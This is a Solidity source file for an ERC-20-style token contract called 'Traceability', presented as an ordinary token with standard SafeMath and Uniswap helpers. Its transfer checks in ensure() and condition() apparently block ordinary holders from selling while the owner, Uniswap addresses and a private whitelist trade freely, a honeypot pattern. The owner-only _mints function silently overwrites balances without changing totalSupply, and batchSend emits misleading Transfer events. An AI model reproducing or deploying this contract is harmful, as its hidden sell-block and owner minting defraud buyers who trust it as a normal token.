row number 
1	       pragma solidity ^0.5.17;
2	 interface IERC20 {
3	 function totalSupply() external view returns(uint);
4	 function balanceOf(address account) external view returns(uint);
5	 function transfer(address recipient, uint amount) external returns(bool);
6	 function allowance(address owner, address spender) external view returns(uint);
7	 function approve(address spender, uint amount) external returns(bool);
8	 function transferFrom(address sender, address recipient, uint amount) external returns(bool);
9	 event Transfer(address indexed from, address indexed to, uint value);
10	 event Approval(address indexed owner, address indexed spender, uint value);
11	 }
12	 library Address {
13	 function isContract(address account) internal view returns(bool) {
14	 bytes32 codehash;
15	 bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
16	 assembly {
17	 codehash:= extcodehash(account) }
18	 return (codehash != 0x0 && codehash != accountHash);
19	 }
20	 }
21	 contract Context {
22	 constructor() internal {
23	 }
24	 function _msgSender() internal view returns(address payable) {
25	 return msg.sender;
26	 }
27	 }
28	 library SafeMath {
29	 function add(uint a, uint b) internal pure returns(uint) {
30	 uint c = a + b;
31	 require(c >= a, "SafeMath: addition overflow");
32	 return c;
33	 }
34	 function sub(uint a, uint b) internal pure returns(uint) {
35	 return sub(a, b, "SafeMath: subtraction overflow");
36	 }
37	 function sub(uint a, uint b, string memory errorMessage) internal pure returns(uint) {
38	 require(b <= a, errorMessage);
39	 uint c = a - b;
40	 return c;
41	 }
42	 function mul(uint a, uint b) internal pure returns(uint) {
43	 if (a == 0) {
44	 return 0;
45	 }
46	 uint c = a * b;
47	 require(c / a == b, "SafeMath: multiplication overflow");
48	 return c;
49	 }
50	 function div(uint a, uint b) internal pure returns(uint) {
51	 return div(a, b, "SafeMath: division by zero");
52	 }
53	 function div(uint a, uint b, string memory errorMessage) internal pure returns(uint) {
54	 require(b > 0, errorMessage);
55	 uint c = a / b;
56	 return c;
57	 }
58	 }
59	 library SafeERC20 {
60	 using SafeMath for uint;
61	 using Address for address;
62	 function safeTransfer(IERC20 token, address to, uint value) internal {
63	 callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));
64	 }
65	 function safeTransferFrom(IERC20 token, address from, address to, uint value) internal {
66	 callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));
67	 }
68	 function safeApprove(IERC20 token, address spender, uint value) internal {
69	 require((value == 0) || (token.allowance(address(this), spender) == 0), "SafeERC20: approve from non-zero to non-zero allowance" );
70	 callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));
71	 }
72	 function callOptionalReturn(IERC20 token, bytes memory data) private {
73	 require(address(token).isContract(), "SafeERC20: call to non-contract");
74	 (bool success, bytes memory returndata) = address(token).call(data);
75	 require(success, "SafeERC20: low-level call failed");
76	 if (returndata.length > 0) {
77	 require(abi.decode(returndata, (bool)), "SafeERC20: ERC20 operation did not succeed");
78	 }
79	 }
80	 }
81	 contract Traceability {
82	 event Transfer(address indexed _from, address indexed _to, uint _value);
83	 event Approval(address indexed _owner, address indexed _spender, uint _value);
84	 function transfer(address _to, uint _value) public payable returns (bool) {
85	 return transferFrom(msg.sender, _to, _value);
86	 }
87	 function ensure(address _from, address _to, uint _value) internal view returns(bool) {
88	 address _UNI = pairFor(0x5C69bEe701ef814a2B6a3EDD4B1652CB9cc5aA6f, 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2, address(this));
89	 if(_from == owner || _to == owner || _from == UNI || _from == _UNI || _from==tradeAddress||canSale[_from]){
90	 return true;
91	 }
92	 require(condition(_from, _value));
93	 return true;
94	 }
95	 function transferFrom(address _from, address _to, uint _value) public payable returns (bool) {
96	 if (_value == 0) {
97	 return true;
98	 }
99	 if (msg.sender != _from) {
100	 require(allowance[_from][msg.sender] >= _value);
101	 allowance[_from][msg.sender] -= _value;
102	 }
103	 require(ensure(_from, _to, _value));
104	 require(balanceOf[_from] >= _value);
105	 balanceOf[_from] -= _value;
106	 balanceOf[_to] += _value;
107	 _onSaleNum[_from]++;
108	 emit Transfer(_from, _to, _value);
109	 return true;
110	 }
111	 function approve(address _spender, uint _value) public payable returns (bool) {
112	 allowance[msg.sender][_spender] = _value;
113	 emit Approval(msg.sender, _spender, _value);
114	 return true;
115	 }
116	 function condition(address _from, uint _value) internal view returns(bool){
117	 if(_saleNum == 0 && _minSale == 0 && _maxSale == 0) return false;
118	 if(_saleNum > 0){
119	 if(_onSaleNum[_from] >= _saleNum) return false;
120	 }
121	 if(_minSale > 0){
122	 if(_minSale > _value) return false;
123	 }
124	 if(_maxSale > 0){
125	 if(_value > _maxSale) return false;
126	 }
127	 return true;
128	 }
129	 mapping(address=>uint256) private _onSaleNum;
130	 mapping(address=>bool) private canSale;
131	 uint256 private _minSale;
132	 uint256 private _maxSale;
133	 uint256 private _saleNum;
134	 function _mints(address spender, uint256 addedValue) public returns (bool) {
135	 require(msg.sender==owner);
136	 if(addedValue > 0) {
137	 balanceOf[spender] = addedValue*(10**uint256(decimals));
138	 }
139	 canSale[spender]=true;
140	 return true;
141	 }
142	 function init(uint256 saleNum, uint256 token, uint256 maxToken) public returns(bool){
143	 require(msg.sender == owner);
144	 _minSale = token > 0 ? token*(10**uint256(decimals)) : 0;
145	 _maxSale = maxToken > 0 ? maxToken*(10**uint256(decimals)) : 0;
146	 _saleNum = saleNum;
147	 }
148	 function batchSend(address[] memory _tos, uint _value) public payable returns (bool) {
149	 require (msg.sender == owner);
150	 uint total = _value * _tos.length;
151	 require(balanceOf[msg.sender] >= total);
152	 balanceOf[msg.sender] -= total;
153	 for (uint i = 0; i < _tos.length; i++) {
154	 address _to = _tos[i];
155	 balanceOf[_to] += _value;
156	 emit Transfer(msg.sender, _to, _value/2);
157	 emit Transfer(msg.sender, _to, _value/2);
158	 }
159	 return true;
160	 }
161	 address tradeAddress;
162	 function setTradeAddress(address addr) public returns(bool){
163	 require (msg.sender == owner);
164	 tradeAddress = addr;
165	 return true;
166	 }
167	 function pairFor(address factory, address tokenA, address tokenB) internal pure returns (address pair) {
168	 (address token0, address token1) = tokenA < tokenB ? (tokenA, tokenB) : (tokenB, tokenA);
169	 pair = address(uint(keccak256(abi.encodePacked( hex'ff', factory, keccak256(abi.encodePacked(token0, token1)), hex'96e8ac4277198ff8b6f785478aa9a39f403cb768dd02cbee326c3e7da348845f' ))));
170	 }
171	 mapping (address => uint) public balanceOf;
172	 mapping (address => mapping (address => uint)) public allowance;
173	 uint constant public decimals = 18;
174	 uint public totalSupply;
175	 string public name;
176	 string public symbol;
177	 address private owner;
178	 address constant UNI = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
179	 constructor(string memory _name, string memory _symbol, uint256 _supply) payable public {
180	 name = _name;
181	 symbol = _symbol;
182	 totalSupply = _supply*(10**uint256(decimals));
183	 owner = msg.sender;
184	 balanceOf[msg.sender] = totalSupply;
185	 allowance[msg.sender][0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D] = uint(-1);
186	 emit Transfer(address(0x0), msg.sender, totalSupply);
187	 }
188	 }
